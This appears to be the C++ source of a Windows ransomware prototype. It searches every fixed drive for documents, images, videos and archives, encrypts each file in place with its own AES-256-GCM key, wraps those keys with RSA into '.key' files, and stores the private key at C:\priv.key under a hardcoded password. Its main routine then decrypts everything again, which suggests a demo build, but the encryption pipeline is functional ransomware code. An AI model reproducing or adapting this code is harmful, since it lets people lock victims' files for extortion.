#include <cstdlib>
#include <vector>
#include <set>
#include <tuple>
#include <fstream>
#include <iostream>
#include <thread>

#include <boost\filesystem.hpp>

#include <openssl\bio.h>
#include <openssl\pem.h>

#include <windows.h>

#include "concurrentqueue.h"
#include "AESCrypto.h"
#include "RSACrypto.h"

using namespace std;
using namespace boost::filesystem;

#define MUTEX_TYPE            HANDLE
#define MUTEX_SETUP(x)        (x) = CreateMutex(NULL, FALSE, NULL)
#define MUTEX_CLEANUP(x)      CloseHandle(x)
#define MUTEX_LOCK(x)         WaitForSingleObject((x), INFINITE)
#define MUTEX_UNLOCK(x)       ReleaseMutex(x)
#define THREAD_ID             GetCurrentThreadId()

struct p_producer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& flag;
};

struct enc_k_producer_bundle {
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& flag;
};

struct enc_p_consumer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
};

struct enc_k_consumer_bundle {
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
};

struct enc_p_cons_k_prod_bundle {
	enc_p_consumer_bundle& p_cons;
	enc_k_producer_bundle& k_prod;
};


struct dec_p_cons_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
	RSA* rsa;
};

set<wstring>* get_wanted_extentions();
set<wstring>* get_ignore_folders();
vector<wstring>* get_available_drives();

void enc_path_producer_thread(p_producer_bundle& p_bundle);
void enc_path_consumer_key_producer_thread(enc_p_cons_k_prod_bundle& pk_bundle);
void enc_key_consumer_thread(enc_k_consumer_bundle& k_bundle);

void dec_path_producer_thread(p_producer_bundle& p_bundle);
void dec_path_consumer_thread(dec_p_cons_bundle& p_bundle);

void do_encryption();
void do_decryption();

/* This array will store all of the mutexes available to OpenSSL. */
static MUTEX_TYPE *mutex_buf = NULL;

static void locking_function(int mode, int n, const char * file, int line)
{
	if (mode & CRYPTO_LOCK)
		MUTEX_LOCK(mutex_buf[n]);
	else
		MUTEX_UNLOCK(mutex_buf[n]);
}


static unsigned long id_function(void)
{
	return ((unsigned long)THREAD_ID);
}

int thread_setup(void)
{
	int i;

	mutex_buf = (HANDLE *)malloc(CRYPTO_num_locks() * sizeof(MUTEX_TYPE));
	if (!mutex_buf)
		return 0;
	for (i = 0; i < CRYPTO_num_locks(); i++)
		MUTEX_SETUP(mutex_buf[i]);
	CRYPTO_set_id_callback(id_function);
	CRYPTO_set_locking_callback(locking_function);
	return 1;
}

int thread_cleanup(void)
{
	int i;
	if (!mutex_buf)
		return 0;
	CRYPTO_set_id_callback(NULL);
	CRYPTO_set_locking_callback(NULL);
	for (i = 0; i < CRYPTO_num_locks(); i++)
		MUTEX_CLEANUP(mutex_buf[i]);
	free(mutex_buf);
	mutex_buf = NULL;
	return 1;
}

int main(int argc, char* argv[]) {
	thread_setup();
	try {
		do_encryption();
		do_decryption();
	}
	catch (...) {
		cout << GetLastError() << endl;
	}
	thread_cleanup();
	
	system("pause");
	return 0;
}

void do_encryption() {
	/* Stores path of files for encryption */
	moodycamel::ConcurrentQueue<wstring> path_queue;
	moodycamel::ProducerToken path_prod_tok(path_queue);

	/* Stores path for key & (AES key + GCM tag) for encryption */
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>> key_queue;
	moodycamel::ProducerToken key_prod_tok(key_queue);

	const int path_producer_count = 1;
	const int path_consumer_count = 4;
	const int key_encrypter_count = 1;

	thread path_producer;
	thread path_consumers[path_consumer_count];
	thread rsa_thread;

	/* File path prod/cons pair */
	atomic<int> doneProducer(0);
	atomic<int> doneComsumer(0);

	/* Key path & data prod/cons pair */
	atomic<int> doneProdEnc(0);
	atomic<int> doneConsEnc(0);

	RSACrypto rsa = RSACrypto();	// Not thread safe

	/* Start path producer thread and fill queue */
	p_producer_bundle path_producer_bundle = { path_queue, path_prod_tok, doneProducer };
	path_producer = thread(bind(&enc_path_producer_thread, ref(path_producer_bundle)));

	/*
	Start path consumer thread and empty path queue
	This thread also fills key_queue so we can encrypt aes keys with rsa
	*/
	enc_p_consumer_bundle path_consumer_bundle = { path_queue, path_prod_tok, doneProducer, doneComsumer, path_producer_count, path_consumer_count };
	enc_k_producer_bundle key_producer_bundle = { key_queue , key_prod_tok, doneProdEnc };
	enc_p_cons_k_prod_bundle path_consumer_key_producer_bundle = { path_consumer_bundle, key_producer_bundle };
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i] = thread(bind(&enc_path_consumer_key_producer_thread, ref(path_consumer_key_producer_bundle)));
	}

	enc_k_consumer_bundle key_consumer_bundle = { key_queue, key_prod_tok, doneProdEnc, doneConsEnc, path_consumer_count, key_encrypter_count };
	rsa_thread = thread(bind(&enc_key_consumer_thread, ref(key_consumer_bundle)));

	/* Have all threads join */
	path_producer.join();
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i].join();
	}
	rsa_thread.join();
}

void do_decryption() {
	/* Get and decrypt private key */
	const char * key_path = "C:\\priv.key";

	BIO *in = BIO_new(BIO_s_file());
	BIO_read_filename(in, key_path);

	RSA *rsa = RSA_new();
	rsa = PEM_read_bio_RSAPrivateKey(in, &rsa, NULL, "SuP3RS3Cr3tPa$$w0Rd");

	BIO_free_all(in);
	
	boost::filesystem::remove(key_path);	// Delete private key

	/* Stores path of key files for decryption */
	moodycamel::ConcurrentQueue<wstring> path_queue;
	moodycamel::ProducerToken path_prod_tok(path_queue);

	const int path_producer_count = 1;
	const int path_consumer_count = 4;

	thread path_producer;
	thread path_consumers[path_consumer_count];

	/* File path prod/cons pair */
	atomic<int> doneProducer(0);
	atomic<int> doneComsumer(0);

	/* Start path producer thread and fill queue */
	p_producer_bundle path_producer_bundle = { path_queue, path_prod_tok, doneProducer };
	path_producer = thread(bind(&dec_path_producer_thread, ref(path_producer_bundle)));

	/* Start path consumer theads and consume queue */
	dec_p_cons_bundle path_consumer_bunde = { path_queue, path_prod_tok, doneProducer, doneComsumer, path_producer_count, path_consumer_count, rsa };
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i] = thread(bind(&dec_path_consumer_thread, ref(path_consumer_bunde)));
	}

	/* Have all threads join */
	path_producer.join();
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i].join();
	}
}

set<wstring>* get_wanted_extentions() {
	set<wstring>* extentions = new set<wstring>();
	// Text
	extentions->insert(L".pdf");
	extentions->insert(L".doc");
	extentions->insert(L".docx");
	extentions->insert(L".txt");
	extentions->insert(L".xls");
	extentions->insert(L".csv");
	// Images 
	extentions->insert(L".jpg");
	extentions->insert(L".jpeg");
	extentions->insert(L".png");
	extentions->insert(L".gif");
	// Video
	extentions->insert(L".webm");
	extentions->insert(L".mkv");
	extentions->insert(L".avi");
	extentions->insert(L".flv");
	extentions->insert(L".mp4");
	extentions->insert(L".wmv");
	extentions->insert(L".mpg");
	extentions->insert(L".mpeg");
	// Compressed
	extentions->insert(L".tar");
	extentions->insert(L".gz");
	extentions->insert(L".zip");
	extentions->insert(L".7z");
	extentions->insert(L".rar");
	// Executables
	/*extentions->insert(L".exe");
	extentions->insert(L".msi");
	extentions->insert(L".bin");
	extentions->insert(L".iso");*/

	return extentions;
}

vector<wstring>* get_available_drives() {

	vector<wstring>* drives = new vector<wstring>();

	WCHAR myDrives[512];
	UINT driveType;

	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
	{
		wprintf(L"GetLogicalDrives() failed with error code: %lu \n", GetLastError());
	}
	else
	{
		wprintf(L"This machine has the following logical drives: \n");

		for (LPWSTR drive = myDrives; *drive != 0; drive += 4)
		{
			driveType = GetDriveTypeW(drive);
			wprintf(L"Drive %s is type %d \n", drive, driveType);
			// Only deal with local drives
			if (driveType == DRIVE_FIXED) {
				wstring drive_string(drive);
				drives->push_back(drive_string);
			}
		}
	}

	return drives;
}


set<wstring>* get_ignore_folders() {
	set<wstring>* ignore_folders = new set<wstring>();

	ignore_folders->insert(L"boost_");
	ignore_folders->insert(L"OpenSSL");
	ignore_folders->insert(L"Perl");
	ignore_folders->insert(L"$");
	ignore_folders->insert(L"Windows");

	return ignore_folders;
}

/* 
Goes through each drive attached on the system and identifies files that 
contain specific extensions adding their full path to a queue for consumption
by the path_consumer_thread
*/
void enc_path_producer_thread(p_producer_bundle& p_bundle) {
	/* Cleanup at end */
	set<wstring>* ignore_folders = get_ignore_folders();
	set<wstring>* wanted_extentions = get_wanted_extentions();
	vector<wstring>* drives = get_available_drives();

	moodycamel::ConcurrentQueue<wstring>& queue = p_bundle.q;
	moodycamel::ProducerToken& ptok = p_bundle.p;
	atomic<int>& flag = p_bundle.flag;

	// For testing
	//drives = new vector<wstring>();
	//drives->push_back(L"C:\\test");

	// Try searching for data on all drives
	for (wstring drive : *drives) {

		recursive_directory_iterator dir(drive), end;
		while (dir != end) {
			try
			{
				if (is_directory(dir->path())) {
					// Exclude certain paths 
					for (wstring partial_folder_name : *ignore_folders) {
						if (dir->path().wstring().find(partial_folder_name) != string::npos) {
							// Don't iterate further into folder
							dir.no_push();
							break;
						}
					}
				}

				if (is_regular_file(dir->path())) {
					// Only gather files with particular extentions
					if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
						queue.enqueue(ptok, dir->path().wstring());
					}
				}

				++dir;
			}
			catch (const filesystem_error& ex)
			{
				printf("PROBLEM PATH - %s\n", dir->path());
				printf("%s\n", ex.what());
			}
		}
	}
	// Notify we are done producing
	flag.fetch_add(1, memory_order_release);

	/* Clean up */
	delete ignore_folders;
	delete wanted_extentions;
	delete drives;
	ignore_folders = NULL;
	wanted_extentions = NULL;
	drives = NULL;
}

/* 
Consumes full paths provided by the path_producer_thread. Each path (file)
is then encrypted by AES-GCM-256 from which we obtain an AES key (256 bit) 
and a GCM tag (128 bit). This data is then queue for consumption by the
key_consumer_thread
*/
void enc_path_consumer_key_producer_thread(enc_p_cons_k_prod_bundle& pk_bundle) {
	/* Unpack p_bundle and k_bundle */
	enc_p_consumer_bundle& p_bundle = pk_bundle.p_cons;
	enc_k_producer_bundle& k_bundle = pk_bundle.k_prod;
	
	/* Unpack path consumer bundle */
	moodycamel::ConcurrentQueue<wstring>& p_queue = p_bundle.q;
	moodycamel::ProducerToken& p_ptok = p_bundle.p;
	atomic<int>& p_doneProducer = p_bundle.prod_flag;
	atomic<int>& p_doneConsumer = p_bundle.cons_flag;
	const int& p_producer_count = p_bundle.producer_count;
	const int& p_consumer_count = p_bundle.consumer_count;

	/* Unpack key producer bundle */
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& k_queue = k_bundle.q;
	moodycamel::ProducerToken& k_ptok = k_bundle.p;
	atomic<int>& k_doneProducer = k_bundle.flag;

	wstring path_str;
	bool items_left;
	do {
		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
		while (p_queue.try_dequeue_from_producer(p_ptok, path_str)) {
			wprintf(L"Encrypting %s\n", &path_str[0]);
			items_left = true;

			AESCrypto aes = AESCrypto();	// New key for each file

			// Save key for key queue (k_queue), will delete ref in key_consumer_thread
			unsigned char * aes_key_and_tag = new unsigned char[32+16]();	// 256 bit key + 128 bit tag
			
			aes.get_aes_key(aes_key_and_tag); // Fill first 32 bytes with aes key
			if (aes.in_place_encrypt(path_str, aes_key_and_tag + 32) > 0) { // Fill last 16 bytes with gcm tag
				k_queue.enqueue(k_ptok, make_tuple(path_str, aes_key_and_tag));
			}
		}
	} while (items_left || p_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == p_consumer_count);
	k_doneProducer.fetch_add(1, memory_order_release);	// Notify key_queue we are done producing
}

void enc_key_consumer_thread(enc_k_consumer_bundle& k_bundle) {
	/* Unpack key consumer bundle */
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& k_queue = k_bundle.q;
	moodycamel::ProducerToken& k_ptok = k_bundle.p;
	atomic<int>& k_doneProducer = k_bundle.prod_flag;
	atomic<int>& k_doneConsumer = k_bundle.cons_flag;
	const int& k_producer_count = k_bundle.producer_count;
	const int& k_consumer_count = k_bundle.consumer_count;

	RSACrypto rsa = RSACrypto();	

	tuple<wstring, unsigned char *> path_key_tag;
	wstring path;
	const unsigned char * aes_key_and_tag;	// [aes_key(32)+aes_tag(16)]
	bool items_left;
	do {
		items_left = k_doneProducer.load(memory_order_acquire) != k_producer_count;
		while (k_queue.try_dequeue_from_producer(k_ptok, path_key_tag)) {
			path = get<0>(path_key_tag);
			aes_key_and_tag = get<1>(path_key_tag);

			wprintf(L"Encrypting key for %s\n", &path[0]);

			path = path + L".key";	// Get the original file path
			rsa.encrypt_key(path, aes_key_and_tag, 32+16);

			/* Clean up */
			delete aes_key_and_tag;
			aes_key_and_tag = NULL;
		}
	} while (items_left || k_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == k_consumer_count);

	/* Save encrypted RSA private key */
	BIO *out = BIO_new_file("C:\\priv.key", "w");
	EVP_PKEY *priv_key = EVP_PKEY_new();
	EVP_PKEY_set1_RSA(priv_key, rsa.get_rsa());
	if (!PEM_write_bio_PKCS8PrivateKey(out, priv_key, EVP_aes_256_cbc(), NULL, NULL, NULL, "SuP3RS3Cr3tPa$$w0Rd")) {
		printf("Failed to write private key, exiting...");
	}
	/* Clean up memory */
	EVP_PKEY_free(priv_key);
	BIO_free_all(out);
	rsa.free_all();
}

void dec_path_producer_thread(p_producer_bundle& p_bundle) {
	set<wstring>* ignore_folders = get_ignore_folders();
	set<wstring> wanted_extentions{L".key"};	// We want to decrypt keys first
	vector<wstring>* drives = get_available_drives();

	moodycamel::ConcurrentQueue<wstring>& queue = p_bundle.q;
	moodycamel::ProducerToken& ptok = p_bundle.p;
	atomic<int>& flag = p_bundle.flag;

	// For testing
	//drives = new vector<wstring>();
	//drives->push_back(L"C:\\test");

	// Try searching for data on all drives
	for (wstring drive : *drives) {

		recursive_directory_iterator dir(drive), end;
		while (dir != end) {
			try
			{
				if (is_directory(dir->path())) {
					// Exclude certain paths 
					for (wstring partial_folder_name : *ignore_folders) {
						if (dir->path().wstring().find(partial_folder_name) != string::npos) {
							// Don't iterate further into folder
							dir.no_push();
							break;
						}
					}
				}

				if (is_regular_file(dir->path())) {
					// Only gather files with .key extentions
					if (wanted_extentions.find(dir->path().extension().wstring()) != wanted_extentions.end()) {
						queue.enqueue(ptok, dir->path().wstring());
					}
				}

				++dir;
			}
			catch (const filesystem_error& ex)
			{
				printf("PROBLEM PATH - %s\n", dir->path());
				printf("%s\n", ex.what() );
			}
		}
	}
	// Notify we are done producing
	flag.fetch_add(1, memory_order_release);

	delete ignore_folders;
	delete drives;
	ignore_folders = NULL;
	drives = NULL;
}

void dec_path_consumer_thread(dec_p_cons_bundle& p_bundle) {
	/* Unpack path cosumer bundle */
	moodycamel::ConcurrentQueue<wstring>& queue = p_bundle.q;
	moodycamel::ProducerToken& ptok = p_bundle.p;
	atomic<int>& p_doneProducer = p_bundle.prod_flag;
	atomic<int>& p_doneConsumer = p_bundle.cons_flag;
	const int& p_producer_count = p_bundle.producer_count;
	const int& p_consumer_count = p_bundle.consumer_count;
	RSA* rsa_struct = p_bundle.rsa;

	RSACrypto rsa = RSACrypto(rsa_struct);

	wstring path;
	bool items_left;
	do {
		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
		while (queue.try_dequeue_from_producer(ptok, path)) {
			wprintf(L"Decrypting key: %s\n", &path[0]);

			unsigned char aes_key_gcm_tag[32 + 16];

			rsa.decrypt_key(path, aes_key_gcm_tag);	// Deletes key file

			AESCrypto aes = AESCrypto(aes_key_gcm_tag);

			path.resize(path.size() - 4);	// Remove ".key" from path

			wprintf(L"Decrypting file: %s\n", &path[0]);

			aes.in_place_decrypt(path, aes_key_gcm_tag + 32);	// Tag is last 16 bytes
		}
	} while (items_left || p_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == p_consumer_count);

	//rsa.free_all();
}